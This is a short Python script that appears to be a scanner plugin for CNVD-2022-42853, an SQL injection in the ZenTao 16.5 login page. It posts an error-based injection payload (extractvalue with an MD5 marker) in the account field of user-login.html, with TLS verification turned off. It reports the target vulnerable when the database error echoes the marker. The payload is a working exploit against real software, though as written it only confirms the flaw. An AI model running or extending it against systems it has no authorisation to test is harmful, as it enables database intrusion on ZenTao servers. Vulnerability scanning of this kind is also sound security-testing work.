import requests
import urllib, re
import random, hashlib

def verify(url):
    result = {
        'name': 'CNVD-2022-42853: 禅道16.5 SQL注入',
        'vulnerable': False,
        'attack': False,
        'about': "https://www.cnblogs.com/hxlinux/p/16552842.html"
    }
    str_num = str(random.randint(1000000000, 9999999999))
    str_md5 = hashlib.md5(str_num.encode()).hexdigest()
    timeout = 3
    vurl = urllib.parse.urljoin(url, '/zentao/user-login.html')
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate",
        "Referer": vurl
    }
    sqli_payload = f"'+and+(select+extractvalue(1,concat(0x7e,(MD5({str_num})),0x7e)))#"
    payload_data = f"account=admin{sqli_payload}"
    try:
        rep = requests.post(vurl, headers=headers, verify=False, timeout=timeout, data=payload_data)
        if re.search("XPATH syntax error", rep.text) and re.search(str_md5[3:-3], rep.text):
            result['vulnerable'] = True
            result['vurl'] = vurl
            result['method'] = "POST"
            result["data"] = payload_data
        return result
    except:
        return result
